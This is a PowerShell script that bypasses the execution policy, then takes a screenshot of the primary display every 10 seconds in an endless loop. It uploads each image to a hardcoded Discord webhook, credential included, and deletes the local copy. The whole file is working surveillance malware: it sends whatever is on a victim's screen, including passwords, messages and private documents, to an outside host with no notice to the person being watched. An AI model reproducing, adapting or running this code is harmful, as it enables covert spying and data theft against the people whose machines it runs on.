# Ensure execution policy allows running scripts
Set-ExecutionPolicy Bypass -Scope Process -Force

# Function to capture screenshot
function Capture-Screenshot {
    param (
        [string]$filePath
    )

    # Load required .NET assemblies
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms

    # Create a Bitmap object and capture the screen
    try {
        $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screenBounds.Width, $screenBounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)

        # Save the bitmap to the specified file path
        $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)

        # Dispose of objects
        $graphics.Dispose()
        $bitmap.Dispose()
    } catch {
        Write-Error "Failed to capture screenshot: $_"
        throw
    }
}

# Function to upload screenshot to Discord webhook
function Upload-Screenshot {
    param (
        [string]$filePath
    )

    $webhookUrl = 'https://ptb.discord.com/api/webhooks/1312008867848130590/Mft6hREHziNE8nLTwTxorXJzni_hqfrILvtZb9zSwiYifrDfq_whOZI3bh3IDg-OA00t'

    # Prepare the file data for upload
    $fileData = @{
        content = 'WHO AM I???.'
        file = [System.IO.File]::ReadAllBytes($filePath)
    }

    # Create a boundary for the multipart form data
    $boundary = [System.Guid]::NewGuid().ToString()
    $multipartContent = New-Object System.Collections.Generic.List[System.Byte[]]

    # Add text field
    $multipartContent.Add([System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`nHere is a screenshot.`r`n"))

    # Add file field
    $multipartContent.Add([System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"screenshot.png`"`r`nContent-Type: image/png`r`n`r`n"))
    $multipartContent.Add($fileData['file'])
    $multipartContent.Add([System.Text.Encoding]::UTF8.GetBytes("`r`n"))

    # Add boundary end
    $multipartContent.Add([System.Text.Encoding]::UTF8.GetBytes("--$boundary--`r`n"))

    # Convert multipart content to a single byte array
    $body = [System.IO.MemoryStream]::new()
    foreach ($part in $multipartContent) {
        $body.Write($part, 0, $part.Length)
    }
    $body.Seek(0, [System.IO.SeekOrigin]::Begin)

    # Send the request
    try {
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
        Write-Host "Screenshot uploaded successfully."
    } catch {
        Write-Error "Error uploading screenshot: $_"
    } finally {
        # Clean up the temporary file
        if (Test-Path $filePath) {
            Remove-Item $filePath -ErrorAction SilentlyContinue
        }
    }
}

# Loop to capture and upload screenshot every 10 seconds
while ($true) {
    # Capture screenshot and save to temporary path
    $tempPath = [System.IO.Path]::GetTempFileName() + ".png"
    try {
        Capture-Screenshot -filePath $tempPath
        Upload-Screenshot -filePath $tempPath
    } catch {
        Write-Error "Failed to create or upload screenshot: $_"
    }

    # Wait for 10 seconds before taking the next screenshot
    Start-Sleep -Seconds 10
}
